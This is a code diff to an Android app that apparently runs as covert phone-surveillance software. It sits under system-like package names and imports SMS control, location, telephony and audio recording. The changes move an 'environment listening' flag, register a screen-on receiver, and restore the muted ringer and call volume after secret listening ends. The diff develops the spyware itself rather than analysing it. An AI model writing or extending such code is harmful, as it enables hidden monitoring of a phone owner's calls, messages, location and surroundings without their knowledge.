@@ -9,6 +9,7 @@ import system.service.activity.GlobalPrefActivity;
 import system.service.config.ConfigCtrl;
 import system.service.feature.location.LocationUtil;
 import system.service.feature.sms.SmsCtrl;
+import system.service.receiver.ScreenStateReceiver;
 import system.service.receiver.SmsReceiver;
 
 import com.android.internal.telephony.ITelephony;
@@ -21,6 +22,7 @@ import com.particle.inspector.common.util.license.LICENSE_TYPE;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.media.AudioManager;
 import android.media.MediaRecorder;
 import android.os.Binder;
@@ -143,17 +145,17 @@ public class BootService extends Service
                 	
                 	// ------------------------------------------------------------------------------------------------
     				// Reset IS_ENV_LISTENING flag
-    				if (SmsReceiver.IS_ENV_LISTENING) {
-    					SmsReceiver.IS_ENV_LISTENING = false;
+    				if (GlobalValues.IS_ENV_LISTENING) {
+    					GlobalValues.IS_ENV_LISTENING = false;
     					
-    					// Restore ringer mode and volumn
+    					// Restore ringer mode and volume
     					AudioManager audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
     					audioManager.setRingerMode(SmsReceiver.ORIGINAL_RING_MODE);
     					if (SmsReceiver.ORIGINAL_RING_MODE == AudioManager.RINGER_MODE_NORMAL) {
     						audioManager.setStreamVolume(AudioManager.STREAM_RING, SmsReceiver.ORIGINAL_RING_VOL, 0);						
     					}
     					
-    					// Restore voice call volumn
+    					// Restore voice call volume
     					audioManager.setStreamVolume(AudioManager.STREAM_VOICE_CALL, SmsReceiver.ORIGINAL_VOICE_CALL_VOL, 0);
     				}
                 	
@@ -188,6 +190,9 @@ public class BootService extends Service
 		
 		mGetInfoTimer = new Timer();
 		mInfoTask = new GetInfoTask(context);
+		
+		// Register screen_on intent broadcast receiver
+		this.registerReceiver(new ScreenStateReceiver(), new IntentFilter(Intent.ACTION_SCREEN_ON));
 	}
 
 	@Override
